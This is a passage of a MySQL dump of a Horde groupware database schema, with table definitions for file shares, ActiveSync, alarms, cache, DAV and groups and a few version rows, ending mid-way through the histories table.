-- MySQL dump 10.13  Distrib 5.5.55, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: horde
-- ------------------------------------------------------
-- Server version	5.5.55-0+deb8u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `horde`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `horde` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `horde`;

--
-- Table structure for table `content_schema_info`
--

DROP TABLE IF EXISTS `content_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `content_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `content_schema_info`
--

LOCK TABLES `content_schema_info` WRITE;
/*!40000 ALTER TABLE `content_schema_info` DISABLE KEYS */;
INSERT INTO `content_schema_info` VALUES (2);
/*!40000 ALTER TABLE `content_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gollem_schema_info`
--

DROP TABLE IF EXISTS `gollem_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `gollem_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gollem_schema_info`
--

LOCK TABLES `gollem_schema_info` WRITE;
/*!40000 ALTER TABLE `gollem_schema_info` DISABLE KEYS */;
INSERT INTO `gollem_schema_info` VALUES (3);
/*!40000 ALTER TABLE `gollem_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gollem_shares`
--

DROP TABLE IF EXISTS `gollem_shares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `gollem_shares` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) NOT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `share_parents` varchar(4000) DEFAULT NULL,
  `perm_creator` int(11) NOT NULL DEFAULT '0',
  `perm_default` int(11) NOT NULL DEFAULT '0',
  `perm_guest` int(11) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_gollem_shares_on_share_name` (`share_name`),
  KEY `index_gollem_shares_on_share_owner` (`share_owner`),
  KEY `index_gollem_shares_on_perm_creator` (`perm_creator`),
  KEY `index_gollem_shares_on_perm_default` (`perm_default`),
  KEY `index_gollem_shares_on_perm_guest` (`perm_guest`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gollem_shares`
--

LOCK TABLES `gollem_shares` WRITE;
/*!40000 ALTER TABLE `gollem_shares` DISABLE KEYS */;
/*!40000 ALTER TABLE `gollem_shares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gollem_shares_groups`
--

DROP TABLE IF EXISTS `gollem_shares_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `gollem_shares_groups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_gollem_shares_groups_on_share_id` (`share_id`),
  KEY `index_gollem_shares_groups_on_group_uid` (`group_uid`),
  KEY `index_gollem_shares_groups_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gollem_shares_groups`
--

LOCK TABLES `gollem_shares_groups` WRITE;
/*!40000 ALTER TABLE `gollem_shares_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `gollem_shares_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gollem_shares_users`
--

DROP TABLE IF EXISTS `gollem_shares_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `gollem_shares_users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_gollem_shares_users_on_share_id` (`share_id`),
  KEY `index_gollem_shares_users_on_user_uid` (`user_uid`),
  KEY `index_gollem_shares_users_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gollem_shares_users`
--

LOCK TABLES `gollem_shares_users` WRITE;
/*!40000 ALTER TABLE `gollem_shares_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `gollem_shares_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gollem_sharesng`
--

DROP TABLE IF EXISTS `gollem_sharesng`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `gollem_sharesng` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `share_parents` varchar(4000) DEFAULT NULL,
  `perm_creator_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_16` tinyint(1) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_gollem_sharesng_on_share_name` (`share_name`),
  KEY `index_gollem_sharesng_on_share_owner` (`share_owner`),
  KEY `index_gollem_sharesng_on_perm_creator_2` (`perm_creator_2`),
  KEY `index_gollem_sharesng_on_perm_creator_4` (`perm_creator_4`),
  KEY `index_gollem_sharesng_on_perm_creator_8` (`perm_creator_8`),
  KEY `index_gollem_sharesng_on_perm_creator_16` (`perm_creator_16`),
  KEY `index_gollem_sharesng_on_perm_default_2` (`perm_default_2`),
  KEY `index_gollem_sharesng_on_perm_default_4` (`perm_default_4`),
  KEY `index_gollem_sharesng_on_perm_default_8` (`perm_default_8`),
  KEY `index_gollem_sharesng_on_perm_default_16` (`perm_default_16`),
  KEY `index_gollem_sharesng_on_perm_guest_2` (`perm_guest_2`),
  KEY `index_gollem_sharesng_on_perm_guest_4` (`perm_guest_4`),
  KEY `index_gollem_sharesng_on_perm_guest_8` (`perm_guest_8`),
  KEY `index_gollem_sharesng_on_perm_guest_16` (`perm_guest_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gollem_sharesng`
--

LOCK TABLES `gollem_sharesng` WRITE;
/*!40000 ALTER TABLE `gollem_sharesng` DISABLE KEYS */;
/*!40000 ALTER TABLE `gollem_sharesng` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gollem_sharesng_groups`
--

DROP TABLE IF EXISTS `gollem_sharesng_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `gollem_sharesng_groups` (
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_gollem_sharesng_groups_on_share_id` (`share_id`),
  KEY `index_gollem_sharesng_groups_on_group_uid` (`group_uid`),
  KEY `index_gollem_sharesng_groups_on_perm_2` (`perm_2`),
  KEY `index_gollem_sharesng_groups_on_perm_4` (`perm_4`),
  KEY `index_gollem_sharesng_groups_on_perm_8` (`perm_8`),
  KEY `index_gollem_sharesng_groups_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gollem_sharesng_groups`
--

LOCK TABLES `gollem_sharesng_groups` WRITE;
/*!40000 ALTER TABLE `gollem_sharesng_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `gollem_sharesng_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gollem_sharesng_users`
--

DROP TABLE IF EXISTS `gollem_sharesng_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `gollem_sharesng_users` (
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_gollem_sharesng_users_on_share_id` (`share_id`),
  KEY `index_gollem_sharesng_users_on_user_uid` (`user_uid`),
  KEY `index_gollem_sharesng_users_on_perm_2` (`perm_2`),
  KEY `index_gollem_sharesng_users_on_perm_4` (`perm_4`),
  KEY `index_gollem_sharesng_users_on_perm_8` (`perm_8`),
  KEY `index_gollem_sharesng_users_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gollem_sharesng_users`
--

LOCK TABLES `gollem_sharesng_users` WRITE;
/*!40000 ALTER TABLE `gollem_sharesng_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `gollem_sharesng_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_activesync_cache`
--

DROP TABLE IF EXISTS `horde_activesync_cache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_activesync_cache` (
  `cache_devid` varchar(255) DEFAULT NULL,
  `cache_user` varchar(255) DEFAULT NULL,
  `cache_data` mediumtext,
  KEY `index_horde_activesync_cache_on_cache_devid` (`cache_devid`),
  KEY `index_horde_activesync_cache_on_cache_user` (`cache_user`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_activesync_cache`
--

LOCK TABLES `horde_activesync_cache` WRITE;
/*!40000 ALTER TABLE `horde_activesync_cache` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_activesync_cache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_activesync_device`
--

DROP TABLE IF EXISTS `horde_activesync_device`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_activesync_device` (
  `device_id` varchar(255) NOT NULL,
  `device_type` varchar(255) NOT NULL,
  `device_agent` varchar(255) NOT NULL,
  `device_supported` text,
  `device_rwstatus` int(11) DEFAULT NULL,
  `device_properties` text,
  PRIMARY KEY (`device_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_activesync_device`
--

LOCK TABLES `horde_activesync_device` WRITE;
/*!40000 ALTER TABLE `horde_activesync_device` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_activesync_device` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_activesync_device_users`
--

DROP TABLE IF EXISTS `horde_activesync_device_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_activesync_device_users` (
  `device_id` varchar(255) NOT NULL,
  `device_user` varchar(255) NOT NULL,
  `device_policykey` bigint(20) DEFAULT '0',
  KEY `index_horde_activesync_device_users_on_device_user` (`device_user`),
  KEY `index_horde_activesync_device_users_on_device_id` (`device_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_activesync_device_users`
--

LOCK TABLES `horde_activesync_device_users` WRITE;
/*!40000 ALTER TABLE `horde_activesync_device_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_activesync_device_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_activesync_mailmap`
--

DROP TABLE IF EXISTS `horde_activesync_mailmap`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_activesync_mailmap` (
  `message_uid` int(11) NOT NULL DEFAULT '0',
  `sync_key` varchar(255) NOT NULL,
  `sync_devid` varchar(255) NOT NULL,
  `sync_folderid` varchar(255) NOT NULL,
  `sync_user` varchar(255) DEFAULT NULL,
  `sync_read` tinyint(1) DEFAULT NULL,
  `sync_deleted` tinyint(1) DEFAULT NULL,
  `sync_flagged` tinyint(1) DEFAULT NULL,
  `sync_changed` tinyint(1) DEFAULT NULL,
  `sync_category` varchar(255) DEFAULT NULL,
  `sync_draft` tinyint(1) DEFAULT NULL,
  KEY `index_horde_activesync_mailmap_on_message_uid` (`message_uid`),
  KEY `index_horde_activesync_mailmap_on_sync_devid` (`sync_devid`),
  KEY `index_horde_activesync_mailmap_on_sync_folderid` (`sync_folderid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_activesync_mailmap`
--

LOCK TABLES `horde_activesync_mailmap` WRITE;
/*!40000 ALTER TABLE `horde_activesync_mailmap` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_activesync_mailmap` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_activesync_map`
--

DROP TABLE IF EXISTS `horde_activesync_map`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_activesync_map` (
  `message_uid` varchar(255) NOT NULL,
  `sync_modtime` int(11) DEFAULT NULL,
  `sync_key` varchar(255) NOT NULL,
  `sync_devid` varchar(255) NOT NULL,
  `sync_folderid` varchar(255) NOT NULL,
  `sync_user` varchar(255) DEFAULT NULL,
  `sync_clientid` varchar(255) DEFAULT NULL,
  `sync_deleted` tinyint(1) DEFAULT NULL,
  KEY `index_horde_activesync_map_on_sync_devid` (`sync_devid`),
  KEY `index_horde_activesync_map_on_message_uid` (`message_uid`),
  KEY `index_horde_activesync_map_on_sync_user` (`sync_user`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_activesync_map`
--

LOCK TABLES `horde_activesync_map` WRITE;
/*!40000 ALTER TABLE `horde_activesync_map` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_activesync_map` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_activesync_schema_info`
--

DROP TABLE IF EXISTS `horde_activesync_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_activesync_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_activesync_schema_info`
--

LOCK TABLES `horde_activesync_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_activesync_schema_info` DISABLE KEYS */;
INSERT INTO `horde_activesync_schema_info` VALUES (23);
/*!40000 ALTER TABLE `horde_activesync_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_activesync_state`
--

DROP TABLE IF EXISTS `horde_activesync_state`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_activesync_state` (
  `sync_mod` int(11) DEFAULT NULL,
  `sync_key` varchar(255) NOT NULL,
  `sync_data` longblob,
  `sync_devid` varchar(255) DEFAULT NULL,
  `sync_folderid` varchar(255) DEFAULT NULL,
  `sync_user` varchar(255) DEFAULT NULL,
  `sync_pending` mediumtext,
  `sync_timestamp` int(11) DEFAULT NULL,
  PRIMARY KEY (`sync_key`),
  KEY `index_horde_activesync_state_on_sync_folderid` (`sync_folderid`),
  KEY `index_horde_activesync_state_on_sync_devid` (`sync_devid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_activesync_state`
--

LOCK TABLES `horde_activesync_state` WRITE;
/*!40000 ALTER TABLE `horde_activesync_state` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_activesync_state` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_alarm_schema_info`
--

DROP TABLE IF EXISTS `horde_alarm_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_alarm_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_alarm_schema_info`
--

LOCK TABLES `horde_alarm_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_alarm_schema_info` DISABLE KEYS */;
INSERT INTO `horde_alarm_schema_info` VALUES (2);
/*!40000 ALTER TABLE `horde_alarm_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_alarms`
--

DROP TABLE IF EXISTS `horde_alarms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_alarms` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `alarm_id` varchar(255) NOT NULL,
  `alarm_uid` varchar(255) DEFAULT NULL,
  `alarm_start` datetime NOT NULL,
  `alarm_end` datetime DEFAULT NULL,
  `alarm_methods` varchar(255) DEFAULT NULL,
  `alarm_params` text,
  `alarm_title` varchar(255) NOT NULL,
  `alarm_text` text,
  `alarm_snooze` datetime DEFAULT NULL,
  `alarm_dismissed` int(1) NOT NULL DEFAULT '0',
  `alarm_internal` text,
  `alarm_instanceid` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_horde_alarms_on_alarm_id` (`alarm_id`),
  KEY `index_horde_alarms_on_alarm_uid` (`alarm_uid`),
  KEY `index_horde_alarms_on_alarm_start` (`alarm_start`),
  KEY `index_horde_alarms_on_alarm_end` (`alarm_end`),
  KEY `index_horde_alarms_on_alarm_snooze` (`alarm_snooze`),
  KEY `index_horde_alarms_on_alarm_dismissed` (`alarm_dismissed`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_alarms`
--

LOCK TABLES `horde_alarms` WRITE;
/*!40000 ALTER TABLE `horde_alarms` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_alarms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_auth_schema_info`
--

DROP TABLE IF EXISTS `horde_auth_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_auth_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_auth_schema_info`
--

LOCK TABLES `horde_auth_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_auth_schema_info` DISABLE KEYS */;
INSERT INTO `horde_auth_schema_info` VALUES (1);
/*!40000 ALTER TABLE `horde_auth_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_cache`
--

DROP TABLE IF EXISTS `horde_cache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_cache` (
  `cache_id` varchar(32) NOT NULL,
  `cache_timestamp` bigint(20) NOT NULL,
  `cache_expiration` bigint(20) NOT NULL,
  `cache_data` longblob,
  PRIMARY KEY (`cache_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_cache`
--

LOCK TABLES `horde_cache` WRITE;
/*!40000 ALTER TABLE `horde_cache` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_cache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_cache_schema_info`
--

DROP TABLE IF EXISTS `horde_cache_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_cache_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_cache_schema_info`
--

LOCK TABLES `horde_cache_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_cache_schema_info` DISABLE KEYS */;
INSERT INTO `horde_cache_schema_info` VALUES (2);
/*!40000 ALTER TABLE `horde_cache_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_core_schema_info`
--

DROP TABLE IF EXISTS `horde_core_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_core_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_core_schema_info`
--

LOCK TABLES `horde_core_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_core_schema_info` DISABLE KEYS */;
INSERT INTO `horde_core_schema_info` VALUES (1);
/*!40000 ALTER TABLE `horde_core_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_dav_collections`
--

DROP TABLE IF EXISTS `horde_dav_collections`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_dav_collections` (
  `id_interface` varchar(255) NOT NULL,
  `id_internal` varchar(255) NOT NULL,
  `id_external` varchar(255) NOT NULL,
  UNIQUE KEY `index_horde_dav_collections_on_id_external` (`id_external`),
  KEY `index_horde_dav_collections_on_id_interface` (`id_interface`),
  KEY `index_horde_dav_collections_on_id_internal` (`id_internal`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_dav_collections`
--

LOCK TABLES `horde_dav_collections` WRITE;
/*!40000 ALTER TABLE `horde_dav_collections` DISABLE KEYS */;
INSERT INTO `horde_dav_collections` VALUES ('contacts','FQtn-yoFHv03iQh6iK8v9WU','contacts~FQtn-yoFHv03iQh6iK8v9WU');
/*!40000 ALTER TABLE `horde_dav_collections` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_dav_objects`
--

DROP TABLE IF EXISTS `horde_dav_objects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_dav_objects` (
  `id_collection` varchar(255) NOT NULL,
  `id_internal` varchar(255) NOT NULL,
  `id_external` varchar(255) NOT NULL,
  UNIQUE KEY `index_horde_dav_objects_on_id_internal` (`id_internal`),
  UNIQUE KEY `index_horde_dav_objects_on_id_external_and_id_collection` (`id_external`,`id_collection`),
  KEY `index_horde_dav_objects_on_id_collection` (`id_collection`),
  KEY `index_horde_dav_objects_on_id_external` (`id_external`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_dav_objects`
--

LOCK TABLES `horde_dav_objects` WRITE;
/*!40000 ALTER TABLE `horde_dav_objects` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_dav_objects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_dav_schema_info`
--

DROP TABLE IF EXISTS `horde_dav_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_dav_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_dav_schema_info`
--

LOCK TABLES `horde_dav_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_dav_schema_info` DISABLE KEYS */;
INSERT INTO `horde_dav_schema_info` VALUES (2);
/*!40000 ALTER TABLE `horde_dav_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_group_schema_info`
--

DROP TABLE IF EXISTS `horde_group_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_group_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_group_schema_info`
--

LOCK TABLES `horde_group_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_group_schema_info` DISABLE KEYS */;
INSERT INTO `horde_group_schema_info` VALUES (3);
/*!40000 ALTER TABLE `horde_group_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_groups`
--

DROP TABLE IF EXISTS `horde_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_groups` (
  `group_uid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `group_name` varchar(255) NOT NULL,
  `group_parents` varchar(255) DEFAULT NULL,
  `group_email` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`group_uid`),
  UNIQUE KEY `index_horde_groups_on_group_name` (`group_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_groups`
--

LOCK TABLES `horde_groups` WRITE;
/*!40000 ALTER TABLE `horde_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_groups_members`
--

DROP TABLE IF EXISTS `horde_groups_members`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_groups_members` (
  `group_uid` int(10) unsigned NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  KEY `index_horde_groups_members_on_group_uid` (`group_uid`),
  KEY `index_horde_groups_members_on_user_uid` (`user_uid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_groups_members`
--

LOCK TABLES `horde_groups_members` WRITE;
/*!40000 ALTER TABLE `horde_groups_members` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_groups_members` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_histories`
--

DROP TABLE IF EXISTS `horde_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_histories` (
  `history_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `object_uid` varchar(255) NOT NULL,
  `history_action` varchar(32) NOT NULL,
  `history_ts` bigint(20) NOT NULL,
  `history_desc` text,
  `history_who` varchar(255) DEFAULT NULL,
  `history_extra` text,
  `history_modseq` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`history_id`),
  KEY `index_horde_histories_on_history_action` (`history_action`),
  KEY `index_horde_histories_on_history_ts` (`history_ts`),
  KEY `index_horde_histories_on_history_modseq` (`history_modseq`),
  KEY `index_horde_histories_on_object_uid` (`object_uid`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
